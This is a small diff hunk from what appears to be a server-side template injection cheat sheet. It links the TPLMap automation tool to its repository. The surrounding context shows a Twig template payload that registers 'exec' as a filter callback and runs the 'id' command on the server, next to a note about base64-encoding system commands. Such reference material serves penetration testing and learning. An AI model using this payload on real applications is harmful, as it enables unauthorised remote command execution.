@@ -42,4 +42,4 @@ Note: Decode decode base64 string to to place system commands
 `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
 
 # Automation tool for SSTI exploitation:
-TPLMap
+[TPLMap](https://github.com/epinna/tplmap)
